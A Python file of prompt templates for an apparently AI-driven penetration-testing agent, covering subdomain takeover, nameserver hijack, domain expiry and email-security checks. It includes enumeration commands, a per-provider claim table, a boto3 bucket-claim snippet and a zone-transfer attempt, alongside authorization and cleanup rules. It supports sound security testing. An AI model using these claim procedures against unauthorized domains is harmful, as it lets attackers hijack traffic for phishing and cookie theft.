"""
RedAmon Domain Takeover Prompts

Black-box workflows for subdomain takeover, domain hijacking, and DNS security:
identifying dangling CNAMEs, expired NS delegations, unclaimed cloud resources,
and vulnerable DNS configurations that allow an attacker to control traffic for
a target domain or subdomain.

This skill is DISTINCT from container_k8s, cloud_infra_exploitation, and
phishing_social_engineering. It focuses specifically on DNS and domain-level
control acquisition.
"""

# =============================================================================
# DOMAIN TAKEOVER MAIN WORKFLOW
# =============================================================================

DOMAIN_TAKEOVER_TOOLS = """
## ATTACK SKILL: DOMAIN TAKEOVER

**CRITICAL: This attack skill has been CLASSIFIED as Domain Takeover.**
**You MUST follow the domain takeover workflow below. Do NOT switch to other attack methods.**

This skill covers FOUR takeover primitives:
1. **Subdomain takeover** — dangling CNAME to a deleted / unclaimed cloud resource
   (S3, CloudFront, Azure App Service, GitHub Pages, Heroku, etc.)
2. **Nameserver delegation hijack** — expired or unclaimed NS records allowing
   an attacker to become authoritative for a zone
3. **Domain expiry / suspension** — expired registration or suspended domain
   that can be re-registered
4. **Misconfigured DNS records** — wildcard misconfig, MX/TXT injection, or
   SPF/DMARC gaps enabling email spoofing infrastructure

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
Subdomain takeover enabled:     {dto_subdomain_enabled}
NS delegation hijack enabled:   {dto_ns_hijack_enabled}
Domain expiry check enabled:    {dto_expiry_enabled}
DNS misconfiguration enabled:   {dto_dns_misconfig_enabled}
Cloud provider scope:           {dto_cloud_providers}
Out-of-scope domains:           {dto_excluded_domains}
```

**Hard rules:**
- If `Subdomain takeover enabled: False`, do NOT attempt to claim dangling
  resources. Only report findings.
- If `NS delegation hijack enabled: False`, do NOT attempt to register or
  repoint nameservers. Only report.
- NEVER claim a subdomain on a production service without explicit operator
  approval. Proof-of-concept on a TEST subdomain is acceptable if authorized.
- Respect `Out-of-scope domains` — never target excluded domains or their subdomains.
- Cleanup: if you claim ANY resource for proof, release it within 24h and
  document the release in the report.

---

## MANDATORY DOMAIN TAKEOVER WORKFLOW

### Step 1: Subdomain enumeration (passive + active)

Build the fullest possible subdomain inventory BEFORE testing for dangling records.

```cypher
MATCH (d:Domain) WHERE d.name CONTAINS '<target_domain>' RETURN d.name, d.dns_records LIMIT 200
MATCH (s:Subdomain) WHERE s.domain CONTAINS '<target_domain>' RETURN s.name, s.source LIMIT 500
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_domain>' RETURN b.url LIMIT 200
```

If graph data is sparse, run enumeration:

```
# Passive OSINT
execute_subfinder({{"args": "-d <TARGET_DOMAIN> -all -json -silent"}})
execute_amass({{"args": "enum -passive -d <TARGET_DOMAIN> -timeout 10"}})
execute_gau({{"args": "--subs --json <TARGET_DOMAIN>"}})

# Active brute-force (only if authorized)
execute_ffuf({{"args": "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<TARGET_DOMAIN> -mc 200,301,302,403 -ac -noninteractive"}})
```

Consolidate unique subdomains into `/tmp/subs.txt`.

**After Step 1, request `transition_phase` to exploitation before proceeding.**

### Step 2: Dangling CNAME detection (subzy + dnsx + httpx)

Check each subdomain for CNAMEs pointing to third-party services that may be
unclaimed.

```
# DNS resolution + CNAME chain
kali_shell({{"command": "dnsx -l /tmp/subs.txt -cname -resp -silent -o /tmp/dnsx_cname.json"}})
# HTTP probe to detect takeover signatures
execute_httpx({{"args": "-l /tmp/subs.txt -sc -title -server -td -fr -silent -j -o /tmp/httpx_subs.json"}})
# Subzy fingerprint scan (90+ provider signatures)
kali_shell({{"command": "subzy run --targets /tmp/subs.txt --concurrency 30 --hide_fails --output /tmp/subzy.json"}})
```

Key takeover fingerprints (HTTP response signals):

| Provider | Fingerprint | Claim method |
|----------|-------------|--------------|
| AWS S3 | `NoSuchBucket` | Create S3 bucket matching CNAME |
| GitHub Pages | `There isn't a GitHub Pages site here` | Create repo with matching CNAME file |
| Heroku | `No such app` | Create Heroku app with matching name |
| Azure App Service | `404 Web Site not found` | Create Azure web app with matching name |
| Azure TrafficManager | `tm-redirect.net` | Configure TrafficManager profile |
| CloudFront | `Bad Request` + CloudFront error | Register CloudFront distribution |
| Fastly | `Fastly error: unknown domain` | Add domain to Fastly service |
| Shopify | `Sorry, this shop is currently unavailable` | Create Shopify store |
| Tumblr | `Not found` / `There's nothing here` | Create Tumblr blog |
| WordPress.com | `Do you want to register <domain>?` | Register WordPress.com site |
| Pantheon | `404 error unknown site` | Create Pantheon site |
| Surge.sh | `project not found` | Create Surge project |
| Netlify | `Not Found - Request ID:` | Add domain to Netlify site |
| Firebase | `Site Not Found` | Create Firebase project |

For each match:
1. Verify the CNAME target with `dig` / `dnsx`
2. Confirm the resource does NOT exist on the provider (create attempt fails
   with "already exists" = NOT vulnerable)
3. Document: subdomain, CNAME target, provider, fingerprint response

### Step 3: Nameserver delegation hijack (CONDITIONAL on `NS delegation hijack enabled`=True)

Check for expired or misconfigured NS delegations:

```
# Get NS records for the target domain and parent
kali_shell({{"command": "dig NS <TARGET_DOMAIN> +short"}})
kali_shell({{"command": "dig NS <TARGET_DOMAIN> @8.8.8.8 +short"}})
# Check for child delegation with different NS set
kali_shell({{"command": "dig NS <SUBDOMAIN>.<TARGET_DOMAIN> +short"}})
# Check domain expiry / registrar
kali_shell({{"command": "whois <TARGET_DOMAIN> | grep -iE 'expir|registrar|status'"}})
```

Vulnerability conditions:
- NS records point to a domain that is expired or available for registration
- Glue records in parent zone do not match child zone NS records
- DNSSEC is not enabled and an attacker can poison the delegation

### Step 4: Domain expiry / suspension (CONDITIONAL on `Domain expiry check enabled`=True)

```
# WHOIS + bulk expiry check
kali_shell({{"command": "whois <TARGET_DOMAIN> > /tmp/whois.txt"}})
# Check for status: clientHold, serverHold, expired, redemptionPeriod
kali_shell({{"command": "grep -iE 'hold|expir|redemption|pendingdelete' /tmp/whois.txt"}})
# Check alternative TLDs
kali_shell({{"command": "for tld in com net org io co uk; do echo <TARGET>.$tld; done | dnsx -a -silent"}})
```

If the primary domain is near expiry or in redemptionPeriod, document the risk
of re-registration by an attacker.

### Step 5: DNS misconfiguration (MX/TXT/SPF/DMARC)

```
# MX records
kali_shell({{"command": "dig MX <TARGET_DOMAIN> +short"}})
# SPF record
kali_shell({{"command": "dig TXT <TARGET_DOMAIN> +short | grep 'v=spf1'"}})
# DMARC record
kali_shell({{"command": "dig TXT _dmarc.<TARGET_DOMAIN> +short"}})
# DKIM selectors (common)
kali_shell({{"command": "for sel in default selector1 selector2 google mail; do dig TXT $sel._domainkey.<TARGET_DOMAIN> +short; done"}})
# Wildcard DNS
kali_shell({{"command": "dig A $(openssl rand -hex 8).<TARGET_DOMAIN> +short"}})
```

Vulnerability conditions:
- Missing DMARC record -> spoofable email domain
- DMARC policy `p=none` -> no enforcement
- SPF `+all` or `?all` -> permissive, allows spoofing
- Missing DKIM -> no cryptographic email validation
- Wildcard A record -> unintended subdomain resolution
- Wildcard MX -> email catch-all that may be attacker-controlled

### Step 6: Proof of concept (CONDITIONAL on `Subdomain takeover enabled`=True)

Only on TEST / non-production subdomains with explicit authorization.

**AWS S3 example:**

```
# Create bucket matching the dangling CNAME
execute_code({{"code": "import boto3; s3=boto3.client('s3'); s3.create_bucket(Bucket='<CNAME_TARGET>', CreateBucketConfiguration={{'LocationConstraint':'us-east-1'}}); s3.put_bucket_website(Bucket='<CNAME_TARGET>', WebsiteConfiguration={{'IndexDocument':{{'Suffix':'index.html'}}}})", "language": "python", "filename": "s3_takeover"}})
# Verify subdomain now serves your content
execute_curl({{"args": "-s http://<SUBDOMAIN>.<TARGET_DOMAIN>"}})
```

**GitHub Pages example:**

```
# Create repo, add CNAME file with target subdomain, enable Pages
# Verify via curl
execute_curl({{"args": "-s http://<SUBDOMAIN>.<TARGET_DOMAIN>"}})
```

For each PoC: capture HTTP response, screenshot evidence, record timestamp.

### Step 7: Cleanup (MANDATORY)

Release any claimed resources:

```
# S3
execute_code({{"code": "import boto3; s3=boto3.client('s3'); s3.delete_bucket(Bucket='<CNAME_TARGET>')", "language": "python", "filename": "s3_cleanup"}})
# GitHub Pages: delete repo or remove CNAME file
# Document release in report
```

### Step 8: Reporting requirements

The final report MUST contain:
- **Subdomains enumerated** (count, sources)
- **Dangling CNAMEs** (subdomain -> CNAME target -> provider -> fingerprint)
- **Vulnerable subdomains** (those confirmed claimable)
- **Nameserver risks** (expired NS, delegation gaps, DNSSEC status)
- **Domain expiry status** (registrar, expiry date, current status)
- **Email security posture** (SPF, DKIM, DMARC policies + gaps)
- **PoC details** (test subdomain, resource claimed, timestamp, cleanup status)
- **Impact** (phishing, cookie theft, OAuth redirect abuse, email spoofing)
- **Remediation** (monitor CNAME lifecycle, claim-susceptible provider blocks,
  DNSSEC, strict DMARC, subdomain inventory automation)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | Subdomain enumerated with dangling CNAME detected | POTENTIAL |
| 2 | Provider fingerprint confirmed (e.g., `NoSuchBucket`) | POTENTIAL (med) |
| 3 | Resource claimed and subdomain serves attacker-controlled content | EXPLOITED |
| 4 | Root domain NS hijacked or domain re-registered | EXPLOITED (CRITICAL) |

Only report Level 3+ as exploited. Level 1-2 with full reproduction steps
qualifies as HIGH severity if the subdomain is production-facing.
"""


# =============================================================================
# DOMAIN TAKEOVER PAYLOAD REFERENCE
# =============================================================================

DOMAIN_TAKEOVER_PAYLOAD_REFERENCE = """
## Domain Takeover Reference

### Provider-specific claim procedures

| Provider | CNAME target pattern | Claim action | Verification curl |
|----------|----------------------|--------------|-----------------|
| AWS S3 | `<bucket>.s3-website-<region>.amazonaws.com` or `<bucket>.s3.amazonaws.com` | Create S3 bucket with matching name, enable static website | `curl -s http://<subdomain>` -> 200 with your index.html |
| AWS CloudFront | `<id>.cloudfront.net` | Register new CloudFront distribution, add CNAME as alternate domain | `curl -s -I http://<subdomain>` -> CloudFront headers |
| GitHub Pages | `<user>.github.io` or `<org>.github.io` | Create repo, add CNAME file with target subdomain, enable Pages | `curl -s http://<subdomain>` -> 200 with your content |
| Heroku | `<app>.herokuapp.com` | Create Heroku app with matching name, add domain | `curl -s http://<subdomain>` -> 200 |
| Azure App Service | `<app>.azurewebsites.net` | Create Azure web app with matching name, verify domain | `curl -s http://<subdomain>` -> 200 |
| Azure TrafficManager | `<profile>.trafficmanager.net` | Create TrafficManager profile, add endpoint | DNS resolution test |
| Shopify | `shops.myshopify.com` | Create Shopify store, add custom domain | `curl -s http://<subdomain>` -> 200 |
| Fastly | `global.ssl.fastly.net` etc. | Add domain to Fastly service | `curl -s -I http://<subdomain>` -> Fastly headers |
| Firebase | `<project>.web.app` or `<project>.firebaseapp.com` | Create Firebase project, add custom domain | `curl -s http://<subdomain>` -> 200 |
| Netlify | `<site>.netlify.app` | Add custom domain to Netlify site | `curl -s http://<subdomain>` -> 200 |
| Tumblr | `tumblr.com` subdomain | Create Tumblr blog, add custom domain | `curl -s http://<subdomain>` -> 200 |
| Pantheon | `pantheonsite.io` | Create Pantheon site, add domain | `curl -s http://<subdomain>` -> 200 |
| Surge.sh | `<project>.surge.sh` | Create Surge project, add CNAME | `curl -s http://<subdomain>` -> 200 |

### DNS reconnaissance one-liners

```bash
# Full DNS record sweep
dig ANY <domain> +short
dig A <domain> +short
dig AAAA <domain> +short
dig MX <domain> +short
dig TXT <domain> +short
dig NS <domain> +short
dig SOA <domain> +short
dig CNAME <subdomain> +short

# Zone transfer attempt
dig axfr <domain> @<ns_server>

# DNSSEC check
dig +dnssec <domain> DNSKEY +short
dig +dnssec <domain> DS +short
```

### Subdomain enumeration wordlists

```
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
```

### Email security checklist

| Record | Purpose | Safe config |
|--------|---------|-------------|
| SPF | Authorize sending IPs | `v=spf1 include:_spf.google.com ~all` |
| DKIM | Cryptographic signature | Present on all selectors |
| DMARC | Enforcement policy | `v=DMARC1; p=quarantine; rua=mailto:dmarc@domain.com` |
| BIMI | Brand indicator (optional) | Requires strict DMARC |

Gaps:
- Missing DMARC -> spoofable
- DMARC `p=none` -> no enforcement
- SPF `+all` -> any IP can send
- Missing DKIM -> no crypto validation
- Multiple weak selectors -> partial coverage
"""
